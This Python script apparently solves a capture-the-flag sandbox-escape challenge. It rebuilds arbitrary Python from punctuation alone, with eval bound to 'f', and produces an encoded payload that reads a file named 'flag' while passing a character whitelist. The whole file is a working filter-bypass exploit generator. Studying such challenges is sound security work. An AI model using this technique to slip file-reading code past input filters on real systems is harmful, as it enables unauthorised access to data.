#!/usr/bin/env python3

BOOL_TRUE = '_'
BOOL_FALSE = 'f_'
INT_6 = '_f'

def encode_bool(val, initialized=True):
    if initialized and val:
        return BOOL_TRUE
    if initialized and not val:
        return BOOL_FALSE
    if val:
        return '[]==[]'
    else:
        return '[]>[]'

def encode_int_6():
    return '-~('+encode_bool(True)+')*(-~-~('+encode_bool(True)+'))'

def encode_int(val):
    if val == 0:
        return '~~'+encode_bool(False)+''
    if val == 1:
        return '~~'+encode_bool(True)+''
    if val == 2:
        return '-~'+encode_bool(True)+''
    if val == 3:
        return '-~-~'+encode_bool(True)+''
    if val == 4:
        return '-~'+encode_bool(True)+'*-~'+encode_bool(True)+''
    if val == 5:
        return '-~'+encode_bool(True)+'*-~'+encode_bool(True)+'+~~'+encode_bool(True)+''
    if val == 6:
        return INT_6
    absval = abs(val)
    if val > 6:
        factor = int(val/6)
        res = int(val%6)
        ret = INT_6+'*'+encode_int(factor)+'+'+encode_int(res)
    else:
        ret = '-~'*absval + '~~' + encode_bool(False) + ''
    return ret if absval == val else "-"+ret

def encode_u():
    # f'{True}'[2]
    return "f'{"+encode_bool(True)+"}'["+encode_int(2)+"]"

def encode_char(val):
    if val in ' !"#$%&\'()*+,-./:;<=>?@f[\\]^_`{|}~\n\r':
        return "'\\'"+val+"\\''"
    if val=='u':
        return encode_u()
    def encode_char_or_int(val):
        assert(len(val) == 1)
        if val in '0123456789':
            return "f'{"+encode_int(int(val))+"}'"
        return "f("+encode_char(val)+")"
    result = '"\'"+'+"'\\\\'+"+encode_u()+"+"+"+".join([encode_char_or_int(x) for x in '00'+eval('f\'{'+str(ord(val))+':x}\'')])+'+"\'"'
    #print(f"1: {val} resulted in {result}")
    return result

def encode_str(value):
  print(f'# encoding {len(value)} characters with len={(len(encode_char(value[0])))},{(len(encode_char(value[1])))},{(len(encode_char(value[2])))},.. each')
  import json
  return 'f(' + '+"+"+'.join(json.dumps(encode_char(c)) for c in value) + ')'

def wrap_in_eval(instr):
    return "f("+instr+")"

def setup_int_6():
    return INT_6+"="+encode_int_6()

def setup_bool_False():
    return BOOL_FALSE+"="+encode_bool(False, False)

def setup_bool_True():
    return BOOL_TRUE+"="+encode_bool(True, False)

if __name__ == '__main__':
    a = []
    a.append(setup_bool_False())
    a.append(setup_bool_True())
    a.append(setup_int_6())
    a.append(wrap_in_eval(wrap_in_eval(encode_str('open("flag","rb").read()'))))
    #a.append(encode_bool(True))
    #a.append(encode_bool(False))
    #a.append(encode_int(5))
    #a.append(encode_int(30))
    #a.append(encode_int(-4))
    #a.append(encode_u())
    #a.append(encode_char('v'))
    #a.append(encode_char('Z'))

    for b in a:
        assert all([c in ' !"#$%&\'()*+,-./:;<=>?@f[\\]^_`{|}~\n\r' for c in b])
    print("f=eval")
    solution = "\n".join(a)
    print(f"# == SOLUTION ({len(solution)} chars) ==")
    print(solution)

    print("#######")
    print("Executing...")
    exec(f"f=eval\n{solution}") # to get output we would need https://stackoverflow.com/questions/3906232/python-get-the-print-output-in-an-exec-statement
    print("done")
